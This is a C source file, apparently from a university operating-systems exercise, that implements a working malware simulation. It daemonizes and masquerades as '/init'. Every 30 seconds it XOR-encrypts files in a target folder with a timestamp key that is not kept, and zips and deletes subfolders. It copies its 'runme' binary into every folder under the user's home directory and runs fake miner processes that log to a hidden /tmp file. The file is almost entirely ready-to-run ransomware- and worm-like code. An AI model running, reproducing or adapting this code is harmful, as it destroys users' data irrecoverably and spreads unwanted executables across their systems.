#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <time.h>
#include <pthread.h>
#include <sys/prctl.h>

#define MAX_MINER 4
#define FOLDER_TARGET "./test"  // Target directory

char *timestamp_key;

void xor_encrypt(const char *path) {
    FILE *f = fopen(path, "rb+");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    char *buffer = malloc(size);
    if (!buffer) {
        fclose(f);
        return;
    }
    fread(buffer, 1, size, f);
    rewind(f);
    for (long i = 0; i < size; i++)
        buffer[i] ^= timestamp_key[i % strlen(timestamp_key)];
    fwrite(buffer, 1, size, f);

    free(buffer);
    fclose(f);
}

void zip_and_encrypt(const char *folder_path) {
    char zip_cmd[8192];
    snprintf(zip_cmd, sizeof(zip_cmd), "zip -r -q '%s.zip' '%s' && rm -rf '%s'", folder_path, folder_path, folder_path);
    system(zip_cmd);

    char zip_file[4096];
    snprintf(zip_file, sizeof(zip_file), "%s.zip", folder_path);
    xor_encrypt(zip_file);
}

void wannacryptor(const char *target) {
    DIR *dir = opendir(target);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;

        char path[4096];
        snprintf(path, sizeof(path), "%s/%s", target, entry->d_name);

        struct stat st;
        if (stat(path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            // For kelompok GENAP â†’ ZIP + XOR + delete
            zip_and_encrypt(path);
        } else if (S_ISREG(st.st_mode)) {
            xor_encrypt(path);
        }
    }
    closedir(dir);
}

void *loop_crypto(void *arg) {
    while (1) {
        wannacryptor(FOLDER_TARGET);
        sleep(30);
    }
}

// --- TROJAN REPLIKASI ---
void replicate_malware() {
    char *home = getenv("HOME");
    if (!home) return;
    DIR *dir = opendir(home);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type != DT_DIR) continue;
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;

        char folder_path[2048];
        snprintf(folder_path, sizeof(folder_path), "%s/%s", home, entry->d_name);

        DIR *sub = opendir(folder_path);
        if (!sub) continue;
        closedir(sub);

        char dest[4096];
        snprintf(dest, sizeof(dest), "%s/runme", folder_path);

        FILE *src = fopen("./runme", "rb");
        FILE *dst = fopen(dest, "wb");
        if (src && dst) {
            char buf[1024];
            size_t n;
            while ((n = fread(buf, 1, sizeof(buf), src)) > 0)
                fwrite(buf, 1, n, dst);
        }
        if (src) fclose(src);
        if (dst) fclose(dst);
    }
    closedir(dir);
}

void *loop_replicate(void *arg) {
    while (1) {
        replicate_malware();
        sleep(30);
    }
}

// --- MINE-CRAFTER ---
char *random_hash() {
    static const char hex[] = "0123456789abcdef";
    static char hash[65];
    for (int i = 0; i < 64; i++)
        hash[i] = hex[rand() % 16];
    hash[64] = '\0';
    return hash;
}

void *mine_crafter(void *arg) {
    int id = *(int *)arg;
    char name[32];
    snprintf(name, sizeof(name), "mine-crafter-%d", id);
    prctl(PR_SET_NAME, name);
    char logpath[] = "/tmp/.miner.log";
    while (1) {
        char *hash = random_hash();
        FILE *f = fopen(logpath, "a");
        if (f) {
            time_t now = time(NULL);
            struct tm *t = localtime(&now);
            fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
                t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                t->tm_hour, t->tm_min, t->tm_sec,
                id, hash);
            fclose(f);
        }
        sleep(rand() % 28 + 3);
    }
    return NULL;
}

void start_wannacryptor() {
    prctl(PR_SET_NAME, "wannacryptor");
    pthread_t t;
    pthread_create(&t, NULL, loop_crypto, NULL);
    pthread_join(t, NULL);
}

void start_trojan() {
    prctl(PR_SET_NAME, "trojan.wrm");
    pthread_t t;
    pthread_create(&t, NULL, loop_replicate, NULL);
    pthread_join(t, NULL);
}

void start_rodok() {
    prctl(PR_SET_NAME, "rodok.exe");
    for (int i = 0; i < MAX_MINER; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            pthread_t t;
            int *id = malloc(sizeof(int));
            *id = i;
            pthread_create(&t, NULL, mine_crafter, id);
            pthread_join(t, NULL);
            exit(0);
        }
    }
    while (1) pause();
}

// --- DAEMONIZATION ---
void daemonize() {
    pid_t pid = fork();
    if (pid > 0) exit(0);
    if (pid < 0) exit(1);

    setsid();
    pid = fork();
    if (pid > 0) exit(0);

    chdir("/");
    fclose(stdin); fclose(stdout); fclose(stderr);

    prctl(PR_SET_NAME, "/init");
}

int main() {
    srand(time(NULL));
    time_t t = time(NULL);
    asprintf(&timestamp_key, "%ld", t);

    daemonize();

    pid_t pid1 = fork();
    if (pid1 == 0) {
        start_wannacryptor();
        exit(0);
    }

    pid_t pid2 = fork();
    if (pid2 == 0) {
        start_trojan();
        exit(0);
    }

    pid_t pid3 = fork();
    if (pid3 == 0) {
        start_rodok();
        exit(0);
    }

    while (1) pause();
    return 0;
}
